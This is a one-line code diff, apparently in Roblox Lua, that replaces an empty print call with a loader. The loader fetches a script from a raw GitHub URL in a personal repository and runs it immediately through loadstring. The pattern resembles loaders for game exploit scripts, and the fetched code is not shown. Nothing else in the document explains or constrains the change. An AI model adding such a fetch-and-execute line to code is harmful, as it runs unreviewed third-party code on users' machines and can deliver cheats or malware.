@@ -1,1 +1,1 @@
-print()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/refs/heads/main/pcd"))()
